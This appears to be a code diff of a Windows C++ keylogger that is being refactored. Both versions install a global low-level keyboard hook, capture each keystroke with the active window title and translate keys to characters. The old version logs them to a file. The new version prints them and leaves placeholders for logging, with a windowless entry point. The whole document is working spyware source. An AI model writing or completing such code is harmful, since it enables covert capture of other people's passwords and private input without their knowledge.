@@ -1,143 +1,146 @@
-#include<Windows.h>
+#include<windows.h>
 #include<iostream>
 #include<fstream>
+#include<map>
 #include<time.h>
-
-#pragma warning(disable:4996)
-#pragma warning(disable:4703)
-
 using namespace std;
 
-HHOOK hook;
-ofstream file;
-char previousProg[256];
 
-int Save(KBDLLHOOKSTRUCT kbData)
+const map<int, string> KEYS{
+	{VK_CAPITAL, "[CAPSLOCK]" },
+	{VK_BACK, "[BACKSPACE]" },
+	{VK_DELETE, "[DELETE]" },
+	{VK_RETURN, "[ENTER]" },
+	{VK_SPACE, "[SPACE]" },
+	{VK_TAB, "[TAB]" },
+	{VK_SHIFT, "[SHIFT]" },
+	{VK_LSHIFT, "[LSHIFT]" },
+	{VK_RSHIFT, "[RSHIFT]" },
+	{VK_CONTROL, "[CONTROL]" },
+	{VK_LCONTROL, "[LCONTROL]" },
+	{VK_RCONTROL, "[RCONTROL]" },
+	{VK_MENU, "[ALT]" },
+	{VK_LWIN, "[LWIN]" },
+	{VK_RWIN, "[RWIN]" },
+	{VK_ESCAPE, "[ESC]" },
+	{VK_END, "[END]" },
+	{VK_HOME, "[HOME]" },
+	{VK_SNAPSHOT, "[PRNTSCREEN]" },
+	{VK_LEFT, "[LEFT]" },
+	{VK_RIGHT, "[RIGHT]" },
+	{VK_UP,	 "[UP]" },
+	{VK_DOWN, "[DOWN]" },
+	{VK_PRIOR, "[PG_UP]" },
+	{VK_NEXT, "[PG_DOWN]" },
+	{VK_F1, "[F1]"},
+	{VK_F2, "[F2]"},
+	{VK_F3, "[F3]"},
+	{VK_F4, "[F4]"},
+	{VK_F5, "[F5]"},
+	{VK_F6, "[F6]"},
+	{VK_F7, "[F7]"},
+	{VK_F8, "[F8]"},
+	{VK_F9, "[F9]"},
+	{VK_F10, "[F10]"},
+	{VK_F11, "[F11]"},
+	{VK_F12, "[F12]"},
+};
+HHOOK _hook;
+
+// Save func prototype. Processed and save data
+int Save(KBDLLHOOKSTRUCT& kbData);
+
+// User thread function prototype
+//DWORD WINAPI KeyloggerThread(LPVOID lpParametr);
+
+// Callback func prototype. Event raised when keyboard key pressed
+LRESULT CALLBACK KeyboardProc(
+	int nCode,
+	WPARAM wParam, // virtual-key code 
+	LPARAM lParam // extended info about wParam
+);
+
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+	if (nCode >= 0 && wParam == WM_KEYDOWN) {
+		KBDLLHOOKSTRUCT kbData = *((KBDLLHOOKSTRUCT*)lParam);
+		Save(kbData);
+	}
+	return CallNextHookEx(_hook, nCode, wParam, lParam);
+}
+
+
+void SetKeylogHook()
+{
+	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0)))
+		MessageBox(NULL, L"0x00FF512 Failed!", NULL, MB_ICONERROR);
+}
+
+void Keylogger()
+{
+	MSG msg;
+	SetKeylogHook();
+	while (GetMessage(&msg, NULL, 0, 0)) {
+		TranslateMessage(&msg);
+		DispatchMessage(&msg);
+	}
+	UnhookWindowsHookEx(_hook);
+}
+
+
+int Save(KBDLLHOOKSTRUCT& kbData)
 {
 	int key = kbData.vkCode;
-	if (key == 1 || key == 2) {
+	char previousW[256] = "";
+
+	if (key == 1 || key == 2)
 		return 0;
-	}
 
 	HWND foregroundW = GetForegroundWindow();
 
 	if (foregroundW) {
-		DWORD pID = GetWindowThreadProcessId(foregroundW, NULL);
-		HKL kbLayout = GetKeyboardLayout(pID);
-		//file << kbLayout << endl;
-		char currentProg[256];
-		GetWindowTextA(foregroundW, currentProg, 256);
-		time_t time_ = time(NULL);
-		//struct tm* tm = localtime(&time_);
-		//char timestamp_buff[64];
-		if (strcmp(previousProg, currentProg) != 0) {
-			strcpy_s(previousProg, currentProg);
-	/*		strftime(timestamp_buff, sizeof(timestamp_buff), "%c", tm);*/
-			file << "[" << currentProg << "|" << time_ << "]\n";
+		DWORD threadID = GetWindowThreadProcessId(foregroundW, NULL);
+		HKL kbLayout = GetKeyboardLayout(threadID);
+		char currentW[256];
+		GetWindowTextA(foregroundW, currentW, sizeof(currentW) / sizeof(char));
+		time_t timestamp = time(NULL);
+		if (strcmp(currentW, previousW)) {
+			strcpy_s(previousW, sizeof(previousW), currentW);
+			// Save to log new program this
 		}
-
-		//strftime(timestamp_buff, sizeof(timestamp_buff), "%H:%M:%S", tm);
-		file << time_ << "|";
-
-		switch (key)
-		{
-		case VK_BACK:
-			file << "[BACKSPACE]" << endl;
-			break;
-		case VK_RETURN:
-			file << "[ENTER]" << endl;
-			break;
-		case VK_SPACE:
-			file << "[SPACE]" << endl;
-			break;
-		case VK_DELETE:
-			file << "[DELETE]" << endl;
-			break;
-		case VK_SNAPSHOT:
-			file << "[PRINTSCREEN]" << endl;
-			break;
-		case VK_SHIFT:
-		case VK_LSHIFT:
-		case VK_RSHIFT:
-			file << "[SHIFT]" << endl;
-			break;
-		case VK_CONTROL:
-		case VK_LCONTROL:
-		case VK_RCONTROL:
-			file << "[CTRL]" << endl;
-			break;
-		case VK_ESCAPE:
-			file << "[ESC]" << endl;
-			break;
-		case VK_UP:
-			file << "[UP]" << endl;
-			break;
-		case VK_DOWN:
-			file << "[DOWN]" << endl;
-			break;
-		case VK_LEFT:
-			file << "[LEFT]" << endl;
-			break;
-		case VK_RIGHT:
-			file << "[RIGHT]" << endl;
-			break;
-		case 20:
-			file << "[CAPS]" << endl;
-		case 109:
-		case 189:
-			file << "." << endl;
-			break;
-		case 110:
-		case 190:
-			file << "-" << endl;
-			break;
-		default:
+		if (KEYS.find(key) != KEYS.end()) {
+			cout << key << " => " << KEYS.at(key) << endl;
+			// Log data this
+		}
+		else {
 			unsigned char keyboardState[256];
 			for (int i = 0; i < 256; ++i)
 				keyboardState[i] = static_cast<unsigned char>(GetKeyState(i));
 			wchar_t wbuffer; // convert virtual key to Unicode according keyboard layout
-			int result = ToUnicodeEx(key, kbData.scanCode, keyboardState, &wbuffer, sizeof(wbuffer)/sizeof(wchar_t), 0, kbLayout);
+			int result = ToUnicodeEx(key, kbData.scanCode, keyboardState, &wbuffer, sizeof(wbuffer) / sizeof(wchar_t), 0, kbLayout);
 			if (result > 0) {
 				char buffer[4] = { 0 }; // UTF-8 max 6-bytes
 				WideCharToMultiByte(CP_ACP, 0, &wbuffer, 1, buffer, sizeof(buffer) / sizeof(char), 0, 0); // Unicode to ANSI
 				cout << wbuffer << " => " << buffer << endl;
-				file << buffer << endl;
+				// Log data this
 			}
-			
-			break;
 		}
 	}
-	file.flush();
 	return 0;
 }
 
-LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
 {
-	if (nCode >= 0) {
-		if (wParam == WM_KEYDOWN) {
-			KBDLLHOOKSTRUCT kbData = *((KBDLLHOOKSTRUCT*)lParam);
-			Save(kbData);
-		}
-	}
-	return CallNextHookEx(hook, nCode, wParam, lParam);
+	Keylogger();
 }
 
-int main()
-{
-	file.open("data.txt");
-	
-	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
 
-	if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0))) {
-		exit(1);
-	}
 
-	MSG msg;
-	// get messages from queue
-	while (GetMessage(&msg, NULL, 0, 0));
-	//for (;;) {
-	//	GetMessage(&msg, NULL, 0, 0);
-	//}
-}
 
-// ÔË‚ÂÚgjrf Ù‚Ù‚Ùadad˚Ù‚Ù
+
+
+
+
+
+
+
